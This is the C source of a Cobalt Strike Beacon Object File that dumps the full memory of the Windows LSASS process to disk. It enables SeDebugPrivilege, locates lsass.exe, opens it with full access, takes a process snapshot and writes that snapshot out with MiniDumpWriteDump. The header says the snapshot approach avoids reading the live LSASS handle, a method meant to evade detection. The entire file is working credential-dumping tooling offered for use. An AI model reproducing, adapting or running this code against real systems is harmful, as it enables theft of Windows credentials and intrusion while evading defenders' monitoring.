// Cobalt Strike Beacon Object File (BOF) to dump LSASS process memory using a snapshot handle. 
// Advantages : Avoids NtReadVirtualMemory on main LSASS handle by reading from SnapShot 
// Author: Sudheer Varma (@0xpwnisher)

#include <Windows.h>
#include "beacon.h"
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <ProcessSnapshot.h>


BOOL CALLBACK MDWDCallbackRoutine(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
	switch (CallbackInput->CallbackType) {
	case 16: // IsProcessSnapshotCallback
		CallbackOutput->Status = S_FALSE;
		break;
	}
	return TRUE;
}


WINBASEAPI       DWORD			WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI       BOOL			WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI	 HANDLE			WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI       HMODULE		WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT  BOOL			WINAPI KERNEL32$Process32Next(HANDLE, void*);
DECLSPEC_IMPORT  BOOL			WINAPI KERNEL32$Process32First(HANDLE, void*);
WINBASEAPI	 STDAPI_(DWORD)         WINAPI KERNEL32$PssFreeSnapshot(HANDLE, HPSS);
WINBASEAPI       FARPROC		WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
WINBASEAPI       HANDLE			WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT  HANDLE			WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINADVAPI        BOOL			WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINADVAPI	 BOOL			WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
WINBASEAPI       STDAPI_(DWORD)         WINAPI KERNEL32$PssCaptureSnapshot(HANDLE, PSS_CAPTURE_FLAGS, DWORD, HPSS);
WINBASEAPI       HANDLE			WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINADVAPI        BOOL                   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
WINBASEAPI       BOOL			WINAPI DBGHELP$MiniDumpWriteDump(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);


BOOL EnableSeDebug(void) {

	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
	
	if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = L"SeDebugPrivilege";

	if (!ADVAPI32$LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)){
		KERNEL32$CloseHandle(hToken);
		return FALSE;
	}

	if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		KERNEL32$CloseHandle(hToken);
		return FALSE;
	}

	KERNEL32$CloseHandle(hToken);

	return TRUE;
}


int GetProcId(void) {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	int pid = -1;
	if (KERNEL32$Process32First(snapshot, &entry) == TRUE) {
		while (KERNEL32$Process32Next(snapshot, &entry) == TRUE) {
			if (mycmpi(entry.szExeFile, "lsass.exe")) {
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	KERNEL32$CloseHandle(snapshot);

	return pid;
}

void go(char* argc, int len) {

	// Check if Beacon is running in High IL
	if (!BeaconIsAdmin()) {

		BeaconPrintf(CALLBACK_ERROR, "Sorry, You are not Admin !\n");
		return;
	}

	// Enable Debug privs
	EnableSeDebug();

	BeaconPrintf(CALLBACK_OUTPUT, "[*] Enable SeDebugPrivilege \n");
	
	DWORD PSSFlags = (PSS_CAPTURE_FLAGS)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;


	int pid = GetProcId();

	
	if (pid < 0) {
		BeaconPrintf(CALLBACK_ERROR, "Could not find lsass pid : 0x%lx\n", KERNEL32$GetLastError());

	}
	
	BeaconPrintf(CALLBACK_OUTPUT, "[*] Lsass PID is: %d\n", pid);

	// Open up a handle to LSASS
	HANDLE processHandle = KERNEL32$OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		(int)pid
	);

	// Error handling
	if (processHandle == INVALID_HANDLE_VALUE)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! Unable to open a handle to the process. Error: 0x%lx\n", KERNEL32$GetLastError());
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened a Handle to LSASS \n");
	}

	// Create Dump File
	HANDLE outFile = KERNEL32$CreateFileW(L"proc.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (outFile == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_ERROR, "Error! Unable to createfile. Error: 0x%lx\n", KERNEL32$GetLastError());
	}


	HANDLE snapshotHandle = NULL;
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
	CallbackInfo.CallbackRoutine = MDWDCallbackRoutine;
	CallbackInfo.CallbackParam = NULL;


	// Get SnapShot Handle for LSASS

	KERNEL32$PssCaptureSnapshot(processHandle, (PSS_CAPTURE_FLAGS)PSSFlags, CONTEXT_ALL, (HPSS*)&snapshotHandle);

	if (snapshotHandle == INVALID_HANDLE_VALUE) {

		BeaconPrintf(CALLBACK_ERROR, "Failed to Obtain SnapShot of LSASS : 0x%lx\n\n", KERNEL32$GetLastError());
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Obtained SnapShot Handle of LSASS \n");
	}


	// MiniDump on SnapShot Handle
	BOOL Dumped = DBGHELP$MiniDumpWriteDump(snapshotHandle, pid, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);

	if (Dumped) {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Memory Dump File Created \n");
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "Error Dumping LSASS Memory: 0x%lx\n", KERNEL32$GetLastError());
	}


	// Close Handles
	KERNEL32$PssFreeSnapshot(KERNEL32$GetCurrentProcess(), (HPSS)snapshotHandle);
	KERNEL32$CloseHandle(outFile);
	KERNEL32$CloseHandle(processHandle);

}
